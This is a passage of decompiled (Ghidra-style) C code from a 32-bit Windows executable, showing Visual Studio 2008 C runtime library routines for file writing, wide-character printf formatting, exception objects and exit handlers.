            pWVar11 = pWVar11 + 1;
            local_1ac0 = local_1ac0 + 1;
          }
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            wVar2 = __putwch_nolock((wchar_t)local_1ac4);
            if (wVar2 != (wint_t)local_1ac4) goto LAB_004105be;
            local_1acc = local_1acc + 2;
            if (local_1ae4 != 0) {
              local_1ac4 = 0xd;
              wVar2 = __putwch_nolock(L'\r');
              if (wVar2 != (wint_t)local_1ac4) goto LAB_004105be;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac0 < _MaxCharCount);
      goto LAB_004105ca;
    }
LAB_004105d3:
    piVar4 = local_1adc;
    if (local_1ac4 != 0) {
      if (local_1ac4 == 5) {
        piVar4 = __errno();
        *piVar4 = 9;
        puVar3 = ___doserrno();
        *puVar3 = 5;
      }
      else {
        __dosmaperr(local_1ac4);
      }
      goto LAB_0041064d;
    }
  }
LAB_0041060f:
  if (((*(byte *)(iVar8 + 4 + *piVar4) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar4 = __errno();
    *piVar4 = 0x1c;
    puVar3 = ___doserrno();
    *puVar3 = 0;
  }
LAB_0041064d:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2008 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425788)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_004257a0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0041072c();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0041072c(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_char(wchar_t param_1)

{
  wint_t wVar1;
  FILE *in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)&in_EAX->_flag & 0x40) == 0) || (in_EAX->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,in_EAX);
    if (wVar1 == 0xffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(wchar_t param_1,int param_2)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_1);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __thiscall _write_string(void *this,int param_1)

{
  int *in_EAX;
  int *piVar1;
  int unaff_EDI;
  
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    while (0 < param_1) {
                    // WARNING: Load size is inaccurate
      param_1 = param_1 + -1;
      _write_char(*this);
      this = (void *)((int)this + 2);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(L'?');
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __woutput_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __woutput_s_l(FILE *_File,wchar_t *_Format,_locale_t _Locale,va_list _ArgList)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int iVar6;
  int extraout_ECX;
  byte *pbVar7;
  int **ppiVar8;
  int *piVar9;
  byte *pbVar10;
  wchar_t *pwVar11;
  bool bVar12;
  longlong lVar13;
  undefined8 uVar14;
  undefined4 uVar15;
  localeinfo_struct *plVar16;
  int *local_470;
  int *local_46c;
  uint local_468;
  wchar_t *local_464;
  undefined4 local_460;
  int *local_45c;
  int local_458;
  int local_454;
  localeinfo_struct local_450;
  int local_448;
  char local_444;
  FILE *local_440;
  char local_43c;
  undefined local_43b;
  uint local_438;
  undefined2 local_434;
  short local_432;
  int *local_430;
  int local_42c;
  int local_428;
  int local_424;
  byte *local_420;
  int **local_41c;
  byte *local_418;
  int *local_414;
  int *local_410;
  uint local_40c;
  int local_408 [127];
  undefined4 local_209;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_440 = _File;
  local_41c = (int **)_ArgList;
  local_458 = 0;
  local_40c = 0;
  local_430 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = 0;
  local_454 = 0;
  local_42c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_450,_Locale);
  if (_File == (FILE *)0x0) {
switchD_0041091f_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if (_Format != (wchar_t *)0x0) {
      local_420 = (byte *)(uint)(ushort)*_Format;
      local_424 = 0;
      local_418 = (byte *)0x0;
      local_438 = 0;
      local_45c = (int *)0x0;
      if (*_Format != L'\0') {
        do {
          pwVar11 = _Format + 1;
          local_464 = pwVar11;
          if (local_424 < 0) break;
          wVar2 = (wchar_t)local_420;
          if ((ushort)(wVar2 + L'￠') < 0x59) {
            uVar4 = local_420[0x41ca68] & 0xf;
          }
          else {
            uVar4 = 0;
          }
          local_438 = (uint)((byte)(&DAT_0041ca88)[local_438 + uVar4 * 9] >> 4);
          ppiVar8 = local_41c;
          switch(local_438) {
          case 0:
switchD_0041091f_caseD_0:
            local_42c = 1;
            _write_char(wVar2);
            ppiVar8 = (int **)_ArgList;
            break;
          case 1:
            local_410 = (int *)0xffffffff;
            local_460 = 0;
            local_454 = 0;
            local_430 = (int *)0x0;
            local_428 = 0;
            local_40c = 0;
            local_42c = 0;
            ppiVar8 = (int **)_ArgList;
            break;
          case 2:
            if (local_420 == (byte *)0x20) {
              local_40c = local_40c | 2;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x23) {
              local_40c = local_40c | 0x80;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x2b) {
              local_40c = local_40c | 1;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x2d) {
              local_40c = local_40c | 4;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x30) {
              local_40c = local_40c | 8;
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 3:
            if (wVar2 == L'*') {
              local_430 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              ppiVar8 = local_41c;
              if ((int)local_430 < 0) {
                local_40c = local_40c | 4;
                local_430 = (int *)-(int)local_430;
              }
            }
            else {
              local_430 = (int *)(local_420 + (int)local_430 * 10 + -0x30);
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 4:
            local_410 = (int *)0x0;
            ppiVar8 = (int **)_ArgList;
            break;
          case 5:
            if (wVar2 == L'*') {
              local_410 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              ppiVar8 = local_41c;
              if ((int)local_410 < 0) {
                local_410 = (int *)0xffffffff;
              }
            }
            else {
              local_410 = (int *)(local_420 + (int)local_410 * 10 + -0x30);
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 6:
            if (local_420 == (byte *)0x49) {
              wVar1 = *pwVar11;
              if ((wVar1 == L'6') && (_Format[2] == L'4')) {
                local_40c = local_40c | 0x8000;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 3;
              }
              else if ((wVar1 == L'3') && (_Format[2] == L'2')) {
                local_40c = local_40c & 0xffff7fff;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 3;
              }
              else {
                ppiVar8 = (int **)_ArgList;
                if (((((wVar1 != L'd') && (wVar1 != L'i')) && (wVar1 != L'o')) &&
                    ((wVar1 != L'u' && (wVar1 != L'x')))) && (wVar1 != L'X')) {
                  local_438 = 0;
                  goto switchD_0041091f_caseD_0;
                }
              }
            }
            else if (local_420 == (byte *)0x68) {
              local_40c = local_40c | 0x20;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x6c) {
              if (*pwVar11 == L'l') {
                local_40c = local_40c | 0x1000;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 2;
              }
              else {
                local_40c = local_40c | 0x10;
                ppiVar8 = (int **)_ArgList;
              }
            }
            else {
              ppiVar8 = (int **)_ArgList;
              if (local_420 == (byte *)0x77) {
                local_40c = local_40c | 0x800;
              }
            }
            break;
          case 7:
            if (local_420 < (byte *)0x65) {
              if (local_420 == (byte *)0x64) {
LAB_00410e1f:
                local_40c = local_40c | 0x40;
LAB_00410e26:
                local_420 = (byte *)0xa;
LAB_00410e30:
                if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
                  local_41c = (int **)((int)_ArgList + 4);
                  if ((local_40c & 0x20) == 0) {
                    piVar3 = *(int **)_ArgList;
                    if ((local_40c & 0x40) == 0) {
                      piVar9 = (int *)0x0;
                    }
                    else {
                      piVar9 = (int *)((int)piVar3 >> 0x1f);
                    }
                  }
                  else {
                    if ((local_40c & 0x40) == 0) {
                      piVar3 = (int *)(uint)*(ushort *)_ArgList;
                    }
                    else {
                      piVar3 = (int *)(int)*(short *)_ArgList;
                    }
                    piVar9 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  local_41c = (int **)((int)_ArgList + 8);
                  piVar3 = *(int **)_ArgList;
                  piVar9 = *(int **)((int)_ArgList + 4);
                }
                if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
                  bVar12 = piVar3 != (int *)0x0;
                  piVar3 = (int *)-(int)piVar3;
                  piVar9 = (int *)-(int)((int)piVar9 + (uint)bVar12);
                  local_40c = local_40c | 0x100;
                }
                if ((local_40c & 0x9000) == 0) {
                  piVar9 = (int *)0x0;
                }
                lVar13 = CONCAT44(piVar9,piVar3);
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x1;
                }
                else {
                  local_40c = local_40c & 0xfffffff7;
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                }
                if (((uint)piVar3 | (uint)piVar9) == 0) {
                  local_428 = 0;
                }
                piVar3 = &local_209;
                while( true ) {
                  piVar9 = (int *)((int)local_410 + -1);
                  if (((int)local_410 < 1) && (lVar13 == 0)) break;
                  local_410 = piVar9;
                  lVar13 = __aulldvrm((uint)lVar13,(uint)((ulonglong)lVar13 >> 0x20),(uint)local_420
                                      ,(int)local_420 >> 0x1f);
                  iVar6 = extraout_ECX + 0x30;
                  if (0x39 < iVar6) {
                    iVar6 = iVar6 + local_458;
                  }
                  *(byte *)piVar3 = (byte)iVar6;
                  piVar3 = (int *)((int)piVar3 + -1);
                }
                local_418 = (byte *)((int)&local_209 + -(int)piVar3);
                local_414 = (int *)((int)piVar3 + 1);
                local_410 = piVar9;
                if (((local_40c & 0x200) != 0) &&
                   ((local_418 == (byte *)0x0 || (*(byte *)local_414 != 0x30)))) {
                  *(byte *)piVar3 = 0x30;
                  local_418 = (byte *)((int)&local_209 + -(int)piVar3 + 1);
                  local_414 = piVar3;
                }
              }
              else if (local_420 < (byte *)0x54) {
                if (local_420 == (byte *)0x53) {
                  if ((local_40c & 0x830) == 0) {
                    local_40c = local_40c | 0x20;
                  }
                  goto LAB_00410bfe;
                }
                if (local_420 != (byte *)0x41) {
                  if (local_420 == (byte *)0x43) {
                    if ((local_40c & 0x830) == 0) {
                      local_40c = local_40c | 0x20;
                    }
LAB_00410ca8:
                    wVar2 = *(wchar_t *)_ArgList;
                    local_468 = (uint)(ushort)wVar2;
                    local_41c = (int **)((int)_ArgList + 4);
                    local_42c = 1;
                    if ((local_40c & 0x20) == 0) {
                      local_408[0]._0_2_ = wVar2;
                    }
                    else {
                      local_43c = (char)wVar2;
                      local_43b = 0;
                      iVar6 = __mbtowc_l((wchar_t *)local_408,&local_43c,
                                         (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                      if (iVar6 < 0) {
                        local_454 = 1;
                      }
                    }
                    local_418 = (byte *)0x1;
                    local_414 = local_408;
                    goto LAB_0041116e;
                  }
                  if ((local_420 != (byte *)0x45) && (local_420 != (byte *)0x47)) goto LAB_0041116e;
                }
                local_420 = local_420 + 0x20;
                local_460 = 1;
LAB_00410b95:
                local_40c = local_40c | 0x40;
                local_418 = (byte *)0x200;
                piVar3 = local_408;
                pbVar10 = local_418;
                piVar9 = local_408;
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x6;
                }
                else if (local_410 == (int *)0x0) {
                  if ((short)local_420 == 0x67) {
                    local_410 = (int *)0x1;
                  }
                }
                else {
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                  if (0xa3 < (int)local_410) {
                    pbVar10 = (byte *)((int)local_410 + 0x15d);
                    local_414 = local_408;
                    local_45c = (int *)__malloc_crt((size_t)pbVar10);
                    piVar3 = local_45c;
                    piVar9 = local_45c;
                    if (local_45c == (int *)0x0) {
                      local_410 = (int *)0xa3;
                      piVar3 = local_408;
                      pbVar10 = local_418;
                      piVar9 = local_414;
                    }
                  }
                }
                local_414 = piVar9;
                local_418 = pbVar10;
                local_470 = *(int **)_ArgList;
                local_41c = (int **)((int)_ArgList + 8);
                local_46c = *(int **)((int)_ArgList + 4);
                plVar16 = &local_450;
                uVar14 = CONCAT44(local_410,(int)(char)local_420);
                ppiVar8 = &local_470;
                piVar9 = piVar3;
                pbVar10 = local_418;
                uVar15 = local_460;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422de8);
                (*pcVar5)(ppiVar8,piVar9,pbVar10,uVar14,uVar15,plVar16);
                uVar4 = local_40c & 0x80;
                if ((uVar4 != 0) && (local_410 == (int *)0x0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422df4);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (((short)local_420 == 0x67) && (uVar4 == 0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422df0);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (*(byte *)piVar3 == 0x2d) {
                  local_40c = local_40c | 0x100;
                  piVar3 = (int *)((int)piVar3 + 1);
                  local_414 = piVar3;
                }
LAB_00410d81:
                local_418 = (byte *)_strlen((char *)piVar3);
              }
              else {
                if (local_420 == (byte *)0x58) goto LAB_00410f7f;
                if (local_420 == (byte *)0x5a) {
                  piVar3 = *(int **)_ArgList;
                  local_41c = (int **)((int)_ArgList + 4);
                  if ((piVar3 == (int *)0x0) ||
                     (local_414 = (int *)piVar3[1], local_414 == (int *)0x0)) {
                    local_414 = (int *)PTR_DAT_00422da0;
                    piVar3 = (int *)PTR_DAT_00422da0;
                    goto LAB_00410d81;
                  }
                  local_418 = (byte *)(int)(short)*(ushort *)piVar3;
                  if ((local_40c & 0x800) != 0) {
                    iVar6 = (int)local_418 - ((int)local_418 >> 0x1f);
                    goto LAB_00411166;
                  }
                  local_42c = 0;
                }
                else {
                  if (local_420 == (byte *)0x61) goto LAB_00410b95;
                  if (local_420 == (byte *)0x63) goto LAB_00410ca8;
                }
              }
LAB_0041116e:
              pbVar10 = local_418;
              if (local_454 == 0) {
                if ((local_40c & 0x40) != 0) {
                  if ((local_40c & 0x100) == 0) {
                    if ((local_40c & 1) == 0) {
                      if ((local_40c & 2) == 0) goto LAB_004111b0;
                      local_434 = 0x20;
                    }
                    else {
                      local_434 = 0x2b;
                    }
                  }
                  else {
                    local_434 = 0x2d;
                  }
                  local_428 = 1;
                }
LAB_004111b0:
                pbVar7 = (byte *)((int)local_430 + (-local_428 - (int)local_418));
                if ((local_40c & 0xc) == 0) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
                _write_string(&local_434,local_428);
                if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
                  _write_multi_char(L'0',(int)pbVar7);
                }
                if ((local_42c == 0) && (0 < (int)pbVar10)) {
                  local_420 = pbVar10;
                  piVar3 = local_414;
                  do {
                    local_420 = local_420 + -1;
                    iVar6 = __mbtowc_l((wchar_t *)&local_468,(char *)piVar3,
                                       (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                    if (iVar6 < 1) {
                      local_424 = -1;
                      break;
                    }
                    _write_char((wchar_t)local_468);
                    piVar3 = (int *)((int)piVar3 + iVar6);
                  } while (0 < (int)local_420);
                }
                else {
                  _write_string(local_414,(int)pbVar10);
                }
                if ((-1 < local_424) && ((local_40c & 4) != 0)) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
              }
            }
            else {
              if ((byte *)0x70 < local_420) {
                if (local_420 == (byte *)0x73) {
LAB_00410bfe:
                  piVar3 = local_410;
                  if (local_410 == (int *)0xffffffff) {
                    piVar3 = (int *)0x7fffffff;
                  }
                  local_41c = (int **)((int)_ArgList + 4);
                  local_414 = *(int **)_ArgList;
                  if ((local_40c & 0x20) == 0) {
                    piVar9 = local_414;
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_u__null__00422da4;
                      piVar9 = (int *)PTR_u__null__00422da4;
                    }
                    for (; (piVar3 != (int *)0x0 &&
                           (piVar3 = (int *)((int)piVar3 + -1), *(ushort *)piVar9 != 0));
                        piVar9 = (int *)((int)piVar9 + 2)) {
                    }
                    iVar6 = (int)piVar9 - (int)local_414;
LAB_00411166:
                    local_41c = (int **)((int)_ArgList + 4);
                    local_42c = 1;
                    local_418 = (byte *)(iVar6 >> 1);
                  }
                  else {
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_DAT_00422da0;
                    }
                    local_418 = (byte *)0x0;
                    piVar9 = local_414;
                    if (0 < (int)piVar3) {
                      do {
                        if (*(byte *)piVar9 == 0) break;
                        iVar6 = __isleadbyte_l((uint)*(byte *)piVar9,&local_450);
                        if (iVar6 != 0) {
                          piVar9 = (int *)((int)piVar9 + 1);
                        }
                        piVar9 = (int *)((int)piVar9 + 1);
                        local_418 = local_418 + 1;
                      } while ((int)local_418 < (int)piVar3);
                    }
                  }
                  goto LAB_0041116e;
                }
                if (local_420 == (byte *)0x75) goto LAB_00410e26;
                if (local_420 != (byte *)0x78) goto LAB_0041116e;
                local_458 = 0x27;
LAB_00410faf:
                local_420 = (byte *)0x10;
                if ((local_40c & 0x80) != 0) {
                  local_434 = 0x30;
                  local_432 = (short)local_458 + 0x51;
                  local_428 = 2;
                }
                goto LAB_00410e30;
              }
              if (local_420 == (byte *)0x70) {
                local_410 = (int *)0x8;
LAB_00410f7f:
                local_458 = 7;
                goto LAB_00410faf;
              }
              if (local_420 < (byte *)0x65) goto LAB_0041116e;
              if (local_420 < (byte *)0x68) goto LAB_00410b95;
              if (local_420 == (byte *)0x69) goto LAB_00410e1f;
              if (local_420 != (byte *)0x6e) {
                if (local_420 != (byte *)0x6f) goto LAB_0041116e;
                local_420 = (byte *)0x8;
                if ((local_40c & 0x80) != 0) {
                  local_40c = local_40c | 0x200;
                }
                goto LAB_00410e30;
              }
              piVar3 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              iVar6 = __get_printf_count_output();
              if (iVar6 == 0) goto switchD_0041091f_caseD_9;
              if ((local_40c & 0x20) == 0) {
                *piVar3 = local_424;
              }
              else {
                *(ushort *)piVar3 = (ushort)local_424;
              }
              local_454 = 1;
            }
            ppiVar8 = local_41c;
            pwVar11 = local_464;
            if (local_45c != (int *)0x0) {
              _free(local_45c);
              local_45c = (int *)0x0;
              ppiVar8 = local_41c;
              pwVar11 = local_464;
            }
            break;
          default:
            goto switchD_0041091f_caseD_9;
          case 0xbad1abe1:
            break;
          }
          local_420 = (byte *)(uint)(ushort)*pwVar11;
          _ArgList = (va_list)ppiVar8;
          _Format = pwVar11;
        } while (*pwVar11 != L'\0');
        if ((local_438 != 0) && (local_438 != 7)) goto LAB_00410884;
      }
      if (local_444 != '\0') {
        *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041134d;
    }
LAB_00410884:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_444 != '\0') {
    *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
  }
LAB_0041134d:
  iVar6 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  size_t sVar1;
  char *_Dst;
  
  *(undefined ***)this = vftable;
  if (*param_1 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar1 = _strlen(*param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,*param_1);
    }
  }
  *(undefined4 *)(this + 8) = 1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  char *pcVar1;
  
  *(undefined ***)this = vftable;
  pcVar1 = *param_1;
  *(undefined4 *)(this + 8) = 0;
  *(char **)(this + 4) = pcVar1;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  
  *(undefined ***)this = vftable;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)(this + 8) = iVar1;
  pcVar3 = *(char **)(param_1 + 4);
  if (iVar1 == 0) {
    *(char **)(this + 4) = pcVar3;
  }
  else if (pcVar3 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar2 = _strlen(pcVar3);
    pcVar3 = (char *)_malloc(sVar2 + 1);
    *(char **)(this + 4) = pcVar3;
    if (pcVar3 != (char *)0x0) {
      _strcpy_s(pcVar3,sVar2 + 1,*(char **)(param_1 + 4));
    }
  }
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall exception::~exception(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall exception::~exception(exception *this)

{
  *(undefined ***)this = std::exception::vftable;
  if (*(int *)(this + 8) != 0) {
    _free(*(void **)(this + 4));
  }
  return;
}



char * __fastcall FUN_00411461(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = s_Unknown_exception_0041c948;
  }
  return pcVar1;
}



exception * __thiscall FUN_0041146e(void *this,byte param_1)

{
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040b579(this);
  }
  return (exception *)this;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = vftable;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_0040b579(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2008 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __onexit_nolock(int param_1)

{
  int *_Memory;
  int *piVar1;
  size_t sVar2;
  size_t sVar3;
  void *pvVar4;
  int iVar5;
  
  _Memory = (int *)__decode_pointer(DAT_00425760);
  piVar1 = (int *)__decode_pointer(DAT_0042575c);
  if ((piVar1 < _Memory) || (iVar5 = (int)piVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return 0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return 0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return 0;
      }
    }
    piVar1 = (int *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_00425760 = __encode_pointer((int)pvVar4);
  }
  iVar5 = __encode_pointer(param_1);
  *piVar1 = iVar5;
  DAT_0042575c = __encode_pointer((int)(piVar1 + 1));
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2008 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040ef88();
  p_Var1 = (_onexit_t)__onexit_nolock((int)_Func);
  FUN_00411601();
  return p_Var1;
}



void FUN_00411601(void)

{
  FUN_0040ef91();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041c964;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_00422788 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_00422788 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
